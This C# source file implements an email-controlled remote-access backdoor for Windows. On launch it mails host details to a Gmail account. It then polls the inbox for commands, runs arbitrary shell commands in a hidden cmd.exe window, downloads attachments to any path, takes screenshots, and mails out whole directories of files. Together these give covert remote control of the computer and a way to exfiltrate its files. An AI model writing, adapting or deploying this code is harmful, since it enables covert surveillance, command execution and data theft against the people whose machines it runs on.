using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

using System.Net;
using System.Net.Mail;

using System.IO;

using System.Drawing;
using System.Drawing.Imaging;

using System.Threading;
using ActiveUp.Net.Mail;

using System.Diagnostics;

using System.Windows.Forms;

namespace Windows_E_mail_Host
{
    class Program
    {
        private const string Login = "***@***.**";
        private const string Password = "***";

        private const string cmdCommand = "CMD";
        private const string downloadAtt = "DOWNLOAD ATTACHMENT";
        private const string makeSS = "MAKE SS";
        private const string sendFilesFromDirectory = "SEND FOLDER";
        static string SSPatch = Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures);

        static string replyTo = "***";

        static void Main(string[] args)
        {
            StringBuilder start = new StringBuilder(10000);
            start.Append("============================== MANUAL ==============================");
            start.AppendLine();
            start.Append(cmdCommand);
            start.Append(" - Use CMD - Write any number lines of commands and end with \"END\"");
            start.AppendLine();
            start.Append(downloadAtt);
            start.Append(" - Download all attachments - (possible specified directory) End with \"END\"");
            start.AppendLine();
            start.Append(makeSS);
            start.Append(" - Make Screen Capture and send it");
            start.AppendLine();
            start.Append(sendFilesFromDirectory);
            start.Append(" - Send all files from directory - Write patch to directory and end with \"END\"");
            start.AppendLine();
            start.Append("============================== SYSTEM & PLATFORM INFO ==============================");
            start.AppendLine();
            start.Append("System: ");
            start.Append(Environment.OSVersion.VersionString);
            start.AppendLine();
            start.Append("64-bit system: ");
            start.Append(Environment.Is64BitOperatingSystem);
            start.AppendLine();
            start.Append("Procesor's cores: ");
            start.Append(Environment.ProcessorCount);
            start.AppendLine();
            start.Append("Version: ");
            start.Append(Environment.Version);
            start.AppendLine();
            start.Append("User Domain Name: ");
            start.Append(Environment.UserDomainName);

            sendEmail("New Machine is Ready For  commands", start.ToString(), null);
            System.Threading.Timer checkForNewMail = new System.Threading.Timer(CheckForMail, null, 0, 10000);

            Microsoft.Win32.SystemEvents.SessionEnding += new Microsoft.Win32.SessionEndingEventHandler(TurnOff);



            Application.Run();
        }

        static void TurnOff(object o, Microsoft.Win32.SessionEndingEventArgs e)
        {
            sendEmail("Session ended", "", null);
        }
        
        static void CheckForMail(object o)
        {
            MailRepository mailRepository = new MailRepository(
                                    "imap.gmail.com",
                                    993,
                                    true,
                                    Login,
                                    Password);

            var allEmailsIndexes = mailRepository.GetMailIndexes("inbox", "ALL");

            for (int i = allEmailsIndexes.Length - 1; i >= 0; i--)
            {
                ActiveUp.Net.Mail.Message email = mailRepository.GetEmail("inbox", allEmailsIndexes[i]);
                if (email.Subject == Environment.MachineName + " / " + Environment.UserName)
                {
                    Console.WriteLine(email.BodyText.Text);


                    string[] EmailLines = email.BodyText.Text.Split(new[] { Environment.NewLine }, StringSplitOptions.RemoveEmptyEntries);

                    replyTo = email.From.Email;

                    for (int line = 0; line < EmailLines.Length; line++)
                    {
                        switch (EmailLines[line])
                        {
                            case cmdCommand:
                                List<string> commands = new List<string>();
                                for (int j = line + 1; j < EmailLines.Length; j++)
                                {
                                    if (EmailLines[j] == "END")
                                    {
                                        line = j;
                                        break;
                                    }
                                    else commands.Add(EmailLines[j]);
                                }
                                sendEmail("CMD Return", UseCMD(commands), null);
                                break;

                            case downloadAtt:

                                string dpatch = @"C:\ProgramData\SystemData\";
                                line++;
                                if (EmailLines[line] != "END") dpatch = EmailLines[line];
                                line++;

                                if (email.Attachments.Count > 0)
                                    email.Attachments.StoreToFolder(dpatch);

                                break;
                            case makeSS:
                                string ssname = MakeScreenCapture();
                                sendEmail("Screen captured", "", new[] { ssname });
                                GC.Collect();
                                GC.WaitForPendingFinalizers();

                                File.Delete(ssname);

                                break;
                            case sendFilesFromDirectory:
                                string spatch = @"C:\ProgramData\SystemData\";
                                line++;
                                if (EmailLines[line] != "END") spatch = EmailLines[line];
                                line++;

                                if (Directory.Exists(spatch)) sendEmail("FOLDER CONTENT SENDED", "", Directory.GetFiles(spatch));
                                else sendEmail("FOLDER DOESN'T EXIST", "", null);

                                break;
                        }

                    }
                    
                    mailRepository.DelateMessage("inbox", allEmailsIndexes[i]);
                }
            }
        }

        static string UseCMD(List<string> commands)
        {
            Process cmd = new Process();
            cmd.StartInfo.FileName = "cmd.exe";
            cmd.StartInfo.RedirectStandardInput = true;
            cmd.StartInfo.RedirectStandardOutput = true;
            cmd.StartInfo.CreateNoWindow = true;
            cmd.StartInfo.UseShellExecute = false;
            cmd.Start();

            foreach (string command in commands)
                cmd.StandardInput.WriteLine(command);

            cmd.StandardInput.Flush();
            cmd.StandardInput.Close();
            cmd.WaitForExit();

            return cmd.StandardOutput.ReadToEnd();
        }

        static void sendEmail(string subject, string body, string[] attachmentsPatch)
        {
            try
            {
                using (System.Net.Mail.SmtpClient client = new System.Net.Mail.SmtpClient())
                {
                    var credential = new NetworkCredential()
                    {
                        UserName = Login,
                        Password = Password
                    };

                    client.Credentials = credential;

                    client.Host = "smtp.gmail.com";
                    client.Port = 587;
                    client.EnableSsl = true;

                    var message = new MailMessage();

                    message.To.Add(new MailAddress(replyTo));
                    message.From = new MailAddress("SystemMailCommander@gmail.com");

                    //message.IsBodyHtml = true;

                    if (attachmentsPatch != null)
                        foreach (string attachmentPatch in attachmentsPatch)
                            message.Attachments.Add(new Attachment(attachmentPatch));


                    StringBuilder bd = new StringBuilder(300);


                    bd.Append(Environment.UserName);
                    bd.Append(" - ");
                    bd.Append(subject);

                    message.Subject = bd.ToString();

                    bd.Clear();

                    bd.Append(@"Machinename: ");
                    bd.Append(Environment.MachineName);
                    bd.Append(Environment.NewLine);
                    bd.Append(@"Username: ");
                    bd.Append(Environment.UserName);
                    bd.Append(Environment.NewLine);
                    bd.Append(Environment.NewLine);
                    bd.Append(DateTime.Now.ToString("yyyy-mm-dd + hh;mm;ss.fff"));
                    bd.Append(Environment.NewLine);
                    bd.Append(Environment.NewLine);
                    bd.Append(body);

                    message.Body = bd.ToString();


                    client.Send(message);
                }
            }
            catch (Exception) { }
        }

        static string MakeScreenCapture()
        {
            string name = SSPatch + DateTime.Now.ToString("yyyy-MM-dd + HH;mm;ss.fff") + ".jpg";

            Bitmap printscreen = new Bitmap(Screen.PrimaryScreen.Bounds.Width,
                                            Screen.PrimaryScreen.Bounds.Height);
            Graphics graphics = Graphics.FromImage(printscreen as Image);
            graphics.CopyFromScreen(0, 0, 0, 0, printscreen.Size);

            
            printscreen.Save(name, ImageFormat.Jpeg);

            return name;
        }


    }
}
